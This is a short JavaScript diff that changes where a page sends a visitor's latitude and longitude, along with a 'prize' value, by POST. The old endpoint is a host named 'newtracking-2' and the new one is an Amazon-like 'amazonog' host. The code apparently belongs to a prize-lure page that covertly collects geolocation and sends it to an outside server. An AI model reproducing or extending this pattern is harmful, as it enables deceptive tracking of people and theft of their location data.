@@ -79,7 +79,7 @@
       const longitude = position.coords.longitude;
       const data = { latitude, longitude, prize };
 
-      fetch("https://newtracking-2.onrender.com/location", {
+      fetch("https://amazonog.onrender.com", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
